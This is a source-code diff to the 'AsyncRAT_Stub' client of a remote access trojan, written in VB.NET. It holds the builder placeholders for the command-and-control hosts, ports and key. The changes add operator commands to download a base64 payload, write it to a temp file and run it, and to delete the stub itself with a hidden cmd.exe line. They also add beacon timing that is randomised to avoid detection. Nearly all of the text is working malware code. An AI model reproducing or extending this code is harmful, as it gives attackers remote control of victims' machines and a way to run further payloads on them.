@@ -18,15 +18,21 @@ Imports System.Threading
 Imports System.Security
 Imports System.Text
 
-'<Assembly: AssemblyTitle("%Title%")>
-'<Assembly: AssemblyDescription("%Description%")>
-'%ASSEMBLY%<Assembly: AssemblyCompany("%Company%")> 
-'%ASSEMBLY%<Assembly: AssemblyProduct("%Product%")> 
-'%ASSEMBLY%<Assembly: AssemblyCopyright("%Copyright%")> 
-'%ASSEMBLY%<Assembly: AssemblyTrademark("%Trademark%")> 
-'%ASSEMBLY%<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")> 
-'%ASSEMBLY%<Assembly: AssemblyVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
-'%ASSEMBLY%<Assembly: Guid("%Guid%")>
+#Const VS = True
+
+#If Not VS Then
+<Assembly: AssemblyTitle("%Title%")>
+<Assembly: AssemblyDescription("%Description%")>
+<Assembly: AssemblyCompany("%Company%")>
+<Assembly: AssemblyProduct("%Product%")>
+<Assembly: AssemblyCopyright("%Copyright%")>
+<Assembly: AssemblyTrademark("%Trademark%")>
+<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
+<Assembly: AssemblyVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
+<Assembly: Guid("%Guid%")>
+#End If
+
+
 
 Namespace AsyncRAT_Stub
 
@@ -56,14 +62,17 @@ Namespace AsyncRAT_Stub
 
 
     Public Class Settings
-        'Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
-        'Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({123456789})
+#If VS Then
         Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"127.0.0.1"})
         Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({6603, 6604, 6605, 6606})
-        Public Shared ReadOnly SPL As String = "<<Async|RAT>>"
         Public Shared ReadOnly KEY As String = "<AsyncRAT123>"
-        'Public Shared ReadOnly KEY As String = "%KEY%"
-        Public Shared ReadOnly VER As String = "v1.0E"
+#Else
+        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
+        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({%PORT%})
+        Public Shared ReadOnly KEY As String = "%KEY%"
+#End If
+        Public Shared ReadOnly VER As String = "v1.0F"
+        Public Shared ReadOnly SPL As String = "<<Async|RAT>>"
     End Class
 
 
@@ -154,13 +163,6 @@ Namespace AsyncRAT_Stub
             End Try
         End Sub
 
-        'Public Shared Sub BeginRead(ByVal b As Byte())
-        '    Try
-        '        Messages.Read(b)
-        '    Catch ex As Exception
-        '    End Try
-        'End Sub
-
         Public Shared Sub Send(ByVal msg As String)
             Try
                 Using MS As New MemoryStream
@@ -206,7 +208,7 @@ Namespace AsyncRAT_Stub
 
         Public Shared Sub Ping()
             While True
-                Thread.Sleep(30 * 1000)
+                Thread.Sleep(New Random().Next(30, 60) * 1000)
                 Try
                     If S.Connected Then
                         Using MS As New MemoryStream
@@ -244,14 +246,16 @@ Namespace AsyncRAT_Stub
                             Program.S.Close()
                         Catch ex As Exception
                         End Try
-
                         Environment.Exit(0)
+
+                    Case "DEL"
+                        SelfDelete
+
+                    Case "UPDATE"
+                        Download(".exe", A(1), True)
 
                     Case "DW"
                         Download(A(1), A(2))
-
-                    Case "UPDATE"
-                        Update(A(1))
 
                     Case "RD-"
                         Program.Send("RD-")
@@ -261,32 +265,32 @@ Namespace AsyncRAT_Stub
 
                 End Select
             Catch ex As Exception
+                Program.Send("Msg" + SPL + ex.Message)
             End Try
         End Sub
 
-        Private Shared Sub Download(ByVal Name As String, ByVal Data As String)
+        Private Shared Sub Download(ByVal Name As String, ByVal Data As String, Optional Update As Boolean = False)
             Try
-                Dim NewFile = Path.GetTempFileName + Name
-                File.WriteAllBytes(NewFile, Convert.FromBase64String(Data))
-                Thread.Sleep(500)
-                Diagnostics.Process.Start(NewFile)
-            Catch ex As Exception
-            End Try
-        End Sub
-
-        Private Shared Sub Update(ByVal Data As String)
-            Try
-                Dim Temp As String = Path.GetTempFileName + ".exe"
+                Dim Temp As String = Path.GetTempFileName + Name
                 File.WriteAllBytes(Temp, Convert.FromBase64String(Data))
                 Thread.Sleep(500)
                 Diagnostics.Process.Start(Temp)
+                If Update Then
+                    SelfDelete()
+                End If
+            Catch ex As Exception
+                Program.Send("Msg" + SPL + ex.Message)
+            End Try
+        End Sub
 
+        Private Shared Sub SelfDelete()
+            Try
                 Dim Del As New Diagnostics.ProcessStartInfo With {
-                .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
-                .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
-                .CreateNoWindow = True,
-                .FileName = "cmd.exe"
-            }
+                    .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
+                    .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
+                    .CreateNoWindow = True,
+                    .FileName = "cmd.exe"
+                    }
 
                 Try
                     Program.S.Shutdown(SocketShutdown.Both)
@@ -297,9 +301,9 @@ Namespace AsyncRAT_Stub
                 Diagnostics.Process.Start(Del)
                 Environment.Exit(0)
             Catch ex As Exception
+                Program.Send("Msg" + SPL + ex.Message)
             End Try
         End Sub
-
 
     End Class
 
